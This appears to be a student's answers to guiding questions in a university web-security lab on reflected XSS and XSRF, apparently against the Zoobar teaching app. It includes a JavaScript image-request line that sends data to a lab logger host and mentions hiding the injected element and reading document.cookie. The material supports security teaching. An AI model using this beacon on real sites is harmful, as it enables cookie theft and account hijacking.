## 3.1: Guiding Questions
>*What is the same origin policy? How does the reflected XSS attack bypass this policy?*

**Same origin policy** is a rule that only lets script access data belonging to the same origin. In this case **same orgin policy** is bypassed due to the victims naivety to click on any link that is sent to them. The code is ran on the victims browser which when sends cookie to the logger.

>*A web application vulnerable to reflected XSS will send the received unfiltered input back to the user (e. g., in a search result page). How can you test for a page’s susceptibility to reflected XSS based on this behavior?*

Test if you can escape any inputs by using <, " and see if any inputs ends up in the inspected html

>*How can you use the log script to send data to the logger? Provide an example in the JavaScript language.*
```javascript
void((new Image()).src='http://dasak-vm-lab-server.eecs.kth.se/logger/log.php?' + 'to=' + '&payload=' + '&random=' + Math.random());
```

>*Which HTML DOM object has a cookie property?*
```javascript
document.cookie;
```
>*he victim is not supposed to see any error messages. What does the following script do?
document.getElementById("x").style.display = ...;*

It hides the the element x which we injected
## 3.2 
>*How can XSRF work? Describe the browser behavior and problems with session management that make the attack
possible*'

Zoobar trusts the cookie blindly with no origin checks 
